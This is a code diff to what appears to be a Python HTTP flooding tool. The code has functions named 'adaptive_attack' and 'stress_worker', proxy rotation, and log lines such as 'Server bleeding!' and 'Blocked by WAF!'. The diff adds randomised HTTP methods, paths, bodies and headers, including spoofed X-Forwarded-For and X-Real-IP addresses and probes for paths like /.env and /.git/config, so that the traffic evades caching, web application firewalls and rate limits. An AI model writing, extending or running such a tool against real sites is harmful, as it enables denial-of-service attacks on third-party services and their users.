@@ -577,6 +577,176 @@ USER_AGENTS = [
 
 ORIGIN_ERROR_CODES = {500, 501, 502, 503, 504, 507, 508, 510,
                       520, 521, 522, 523, 524, 525, 526, 527, 530}
+_HTTP_METHODS = ["GET", "POST", "HEAD", "PUT", "OPTIONS", "DELETE", "PATCH"]
+_HTTP_METHOD_WEIGHTS = [32, 20, 12, 10, 9, 9, 8]
+
+_COMMON_PATHS = [
+    "/", "/index.html", "/index.php", "/home", "/default",
+    "/wp-admin/", "/wp-login.php", "/wp-json/wp/v2/users", "/xmlrpc.php",
+    "/admin", "/admin/", "/admin/login", "/administrator/", "/login",
+    "/signin", "/register", "/api", "/api/", "/api/v1/", "/api/v2/",
+    "/api/v3/", "/graphql", "/rest/", "/rpc", "/jsonrpc",
+    "/search", "/user/", "/users", "/account", "/profile",
+    "/.env", "/.git/config", "/config.json", "/config.php",
+    "/phpinfo.php", "/info.php", "/server-status", "/server-info",
+    "/backup.zip", "/backup.tar.gz", "/db.sql", "/dump.sql",
+    "/static/", "/assets/", "/uploads/", "/images/", "/css/", "/js/",
+    "/health", "/healthz", "/status", "/metrics", "/debug", "/test",
+    "/cgi-bin/", "/shell", "/console", "/.well-known/security.txt",
+    "/robots.txt", "/sitemap.xml", "/feed", "/rss", "/atom.xml",
+]
+
+_ACCEPT_HEADERS = [
+    "*/*",
+    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+    "application/json, text/plain, */*",
+    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
+    "application/xml, text/xml, */*",
+    "text/plain, */*; q=0.01",
+]
+
+_ACCEPT_LANGS = [
+    "en-US,en;q=0.9", "en-GB,en;q=0.8", "en-CA,en;q=0.9",
+    "fa-IR,fa;q=0.9,en;q=0.8", "de-DE,de;q=0.9,en;q=0.8",
+    "fr-FR,fr;q=0.9,en;q=0.8", "es-ES,es;q=0.9,en;q=0.8",
+    "it-IT,it;q=0.9,en;q=0.8", "pt-BR,pt;q=0.9,en;q=0.8",
+    "ru-RU,ru;q=0.9,en;q=0.8", "tr-TR,tr;q=0.9,en;q=0.8",
+    "zh-CN,zh;q=0.9,en;q=0.8", "ja-JP,ja;q=0.9,en;q=0.8",
+    "ko-KR,ko;q=0.9,en;q=0.8", "ar-SA,ar;q=0.9,en;q=0.8",
+    "hi-IN,hi;q=0.9,en;q=0.8",
+]
+
+_ACCEPT_ENCODINGS = [
+    "gzip, deflate, br",
+    "gzip, deflate",
+    "gzip, deflate, br, zstd",
+    "identity",
+    "gzip",
+    "*",
+]
+
+_CACHE_CONTROLS = [
+    "no-cache", "no-store", "no-cache, no-store, must-revalidate",
+    "max-age=0", "max-age=3600", "max-age=86400",
+    "public, max-age=31536000, immutable",
+]
+
+_REFERERS = [
+    "https://www.google.com/",
+    "https://www.google.co.uk/",
+    "https://www.bing.com/",
+    "https://duckduckgo.com/",
+    "https://yandex.com/",
+    "https://www.facebook.com/",
+    "https://twitter.com/",
+    "https://t.me/",
+    "https://www.reddit.com/",
+    "https://www.youtube.com/",
+    "https://github.com/",
+    "https://stackoverflow.com/",
+    "https://www.linkedin.com/",
+    "https://www.instagram.com/",
+]
+
+
+def _rand_http_method():
+    return random.choices(_HTTP_METHODS, weights=_HTTP_METHOD_WEIGHTS, k=1)[0]
+
+
+def _rand_http_path(parsed_target=None):
+    r = random.random()
+    if parsed_target and parsed_target.path and parsed_target.path != "/" and r < 0.30:
+        base = parsed_target.path
+        if random.random() < 0.5:
+            return base
+        return base.rstrip("/") + "/" + random_string(random.randint(3, 12))
+    if r < 0.25:
+        return "/" + random_string(random.randint(3, 20))
+    if r < 0.55:
+        return random.choice(_COMMON_PATHS)
+    if r < 0.75:
+        base = random.choice(_COMMON_PATHS)
+        if base.endswith("/"):
+            return base + random_string(random.randint(3, 12))
+        return base + "/" + random_string(random.randint(3, 12))
+    parts = [random_string(random.randint(3, 10)) for _ in range(random.randint(2, 5))]
+    return "/" + "/".join(parts)
+
+
+def _rand_http_extra_query():
+    n = random.randint(0, 4)
+    if n == 0:
+        return ""
+    parts = []
+    for _ in range(n):
+        k = random_string(random.randint(3, 10))
+        v = random_string(random.randint(3, 20))
+        parts.append(f"{k}={v}")
+    return "&".join(parts)
+
+
+def _rand_http_payload(method):
+    if method in ("GET", "HEAD", "OPTIONS"):
+        return None, None
+    r = random.random()
+    if r < 0.30:
+        data = {
+            random_string(6): random_string(12),
+            "ts": int(time.time() * 1000),
+            "id": random.randint(1, 10**9),
+            "items": [random_string(8) for _ in range(random.randint(1, 5))],
+            "meta": {"k": random_string(10), "v": random_string(10)},
+        }
+        try:
+            return json.dumps(data).encode(), "application/json"
+        except Exception:
+            return None, None
+    if r < 0.55:
+        parts = [f"{random_string(5)}={random_string(10)}"
+                 for _ in range(random.randint(1, 6))]
+        return "&".join(parts).encode(), "application/x-www-form-urlencoded"
+    if r < 0.75:
+        xml = (f"<?xml version=\"1.0\"?>"
+               f"<root><id>{random.randint(1, 10**6)}</id>"
+               f"<data>{random_string(24)}</data></root>")
+        return xml.encode(), "application/xml"
+    if r < 0.90:
+        return random_string(random.randint(16, 256)).encode(), "text/plain"
+    return os.urandom(random.randint(16, 512)), "application/octet-stream"
+
+
+def _rand_http_headers():
+    headers = {
+        "User-Agent": random.choice(USER_AGENTS),
+        "Accept": random.choice(_ACCEPT_HEADERS),
+        "Accept-Language": random.choice(_ACCEPT_LANGS),
+        "Accept-Encoding": random.choice(_ACCEPT_ENCODINGS),
+        "Cache-Control": random.choice(_CACHE_CONTROLS),
+        "Referer": random.choice(_REFERERS),
+    }
+    if random.random() < 0.6:
+        headers["X-Forwarded-For"] = (
+            f"{random.randint(1,255)}.{random.randint(0,255)}."
+            f"{random.randint(0,255)}.{random.randint(1,254)}"
+        )
+    if random.random() < 0.4:
+        headers["X-Real-IP"] = (
+            f"{random.randint(1,255)}.{random.randint(0,255)}."
+            f"{random.randint(0,255)}.{random.randint(1,254)}"
+        )
+    if random.random() < 0.3:
+        headers["X-Requested-With"] = "XMLHttpRequest"
+    if random.random() < 0.2:
+        headers["DNT"] = random.choice(["1", "0"])
+    if random.random() < 0.2:
+        headers["Upgrade-Insecure-Requests"] = "1"
+    if random.random() < 0.2:
+        headers["Origin"] = random.choice(_REFERERS).rstrip("/")
+    if random.random() < 0.4:
+        headers["Cookie"] = f"{random_string(6)}={random_string(24)}"
+    for _ in range(random.randint(0, 3)):
+        headers[f"X-{random_string(6)}"] = random_string(20)
+    return headers
 
 
 def short_proxy(proxy):
@@ -2340,6 +2510,12 @@ async def adaptive_attack(worker_func, target_url, initial_concurrency,
 
 async def stress_worker(direct_session, target_url, duration, stats,
                         use_proxy=False, safe_state=None, rps_limiter=None):
+    from urllib.parse import urlparse
+    try:
+        parsed_target = urlparse(target_url)
+    except Exception:
+        parsed_target = None
+
     start_time = time.monotonic()
     while time.monotonic() - start_time < duration:
         if _INTERRUPTED[0]:
@@ -2351,13 +2527,6 @@ async def stress_worker(direct_session, target_url, duration, stats,
         if rps_limiter is not None:
             await rps_limiter.wait()
 
-        separator = "&" if "?" in target_url else "?"
-        url = f"{target_url}{separator}cache_bust={random_string(10)}"
-        headers = {
-            "User-Agent": random.choice(USER_AGENTS),
-            "Accept-Encoding": "gzip, deflate, br",
-            "Connection": "keep-alive"
-        }
         session = direct_session
         proxy_key = None
         use_ssl_ctx = False
@@ -2384,31 +2553,64 @@ async def stress_worker(direct_session, target_url, duration, stats,
         else:
             tag = f"  {Colors.DIM}[via DIRECT]{Colors.RESET}"
 
+        method = _rand_http_method()
+        path = _rand_http_path(parsed_target)
+        payload, content_type = _rand_http_payload(method)
+
+        if parsed_target and parsed_target.netloc:
+            scheme = parsed_target.scheme or "http"
+            netloc = parsed_target.netloc
+            orig_query = parsed_target.query or ""
+            extra_q = _rand_http_extra_query()
+            qparts = []
+            if orig_query:
+                qparts.append(orig_query)
+            if extra_q:
+                qparts.append(extra_q)
+            qparts.append(f"_={random_string(8)}")
+            url = f"{scheme}://{netloc}{path}?{'&'.join(qparts)}"
+        else:
+            sep = "&" if "?" in target_url else "?"
+            url = f"{target_url}{sep}_={random_string(8)}"
+
+        headers = _rand_http_headers()
+        if content_type:
+            headers["Content-Type"] = content_type
+
         req_start = time.perf_counter()
         stats["requests"] += 1
         try:
             ssl_param = PROXY_SSL_CTX if use_ssl_ctx else False
-            async with session.get(url, headers=headers,
-                                   timeout=aiohttp.ClientTimeout(total=8),
-                                   ssl=ssl_param) as response:
+            request_kwargs = {
+                "headers": headers,
+                "timeout": aiohttp.ClientTimeout(total=8),
+                "ssl": ssl_param,
+                "allow_redirects": False,
+            }
+            if payload is not None:
+                request_kwargs["data"] = payload
+
+            async with session.request(method, url, **request_kwargs) as response:
                 latency = int((time.perf_counter() - req_start) * 1000)
                 status = response.status
+                mtag = f"{Colors.DIM}[{method}]{Colors.RESET}"
+
                 if status == 200:
                     stats["success"] += 1
                     if proxy_key: PROXY_MANAGER.record_request(proxy_key, True)
-                    log_event("200", f"Target hit!  Latency: {Colors.BOLD}{latency:>4}ms{Colors.RESET}{tag}")
+                    log_event("200", f"{mtag} Target hit!  Latency: {Colors.BOLD}{latency:>4}ms{Colors.RESET}{tag}")
                 elif status == 403:
                     stats["blocked"] += 1
                     if proxy_key: PROXY_MANAGER.record_request(proxy_key, False)
-                    log_event("403", f"Blocked by WAF!  Latency: {latency}ms{tag}")
+                    log_event("403", f"{mtag} Blocked by WAF!  Latency: {latency}ms{tag}")
                 elif status == 429:
                     stats["rate_limit"] += 1
                     if proxy_key: PROXY_MANAGER.record_request(proxy_key, False)
-                    log_event("429", f"Rate limit triggered.  Latency: {latency}ms{tag}")
+                    log_event("429", f"{mtag} Rate limit triggered.  Latency: {latency}ms{tag}")
                 elif status in ORIGIN_ERROR_CODES:
                     stats["server_error"] += 1
                     if proxy_key: PROXY_MANAGER.record_request(proxy_key, True)
-                    log_event(str(status), f"Server bleeding!  Latency: {latency}ms{tag}")
+                    log_event(str(status), f"{mtag} Server bleeding!  Latency: {latency}ms{tag}")
                     if safe_state is not None and safe_state.enabled:
                         if safe_state.trigger(status):
                             if LIVE_DASHBOARD.enabled:
@@ -2420,22 +2622,23 @@ async def stress_worker(direct_session, target_url, duration, stats,
                 elif 500 <= status <= 599:
                     stats["server_error"] += 1
                     if proxy_key: PROXY_MANAGER.record_request(proxy_key, True)
-                    log_event(str(status), f"Server error!  Latency: {latency}ms{tag}")
+                    log_event(str(status), f"{mtag} Server error!  Latency: {latency}ms{tag}")
                 else:
                     stats["other"] += 1
                     if proxy_key: PROXY_MANAGER.record_request(proxy_key, False)
-                    log_event("OTHER", f"Status {status}.  Latency: {latency}ms{tag}")
+                    log_event("OTHER", f"{mtag} Status {status}.  Latency: {latency}ms{tag}")
         except asyncio.TimeoutError:
             stats["timeouts"] += 1
             if proxy_key: PROXY_MANAGER.record_request(proxy_key, True)
-            log_event("TIMEOUT", f"Server drowning, timeout!{tag}")
+            log_event("TIMEOUT", f"[{method}] Server drowning, timeout!{tag}")
         except asyncio.CancelledError:
             raise
         except Exception as e:
             stats["dropped"] += 1
             if proxy_key: PROXY_MANAGER.record_request(proxy_key, False)
             err_msg = str(e)[:80] if str(e) else type(e).__name__
-            log_event("FAIL", f"{type(e).__name__}: {err_msg}{tag}")
+            log_event("FAIL", f"[{method}] {type(e).__name__}: {err_msg}{tag}")
+            
 
 
 async def run_benchmark(target_url, concurrency, duration, use_proxy,
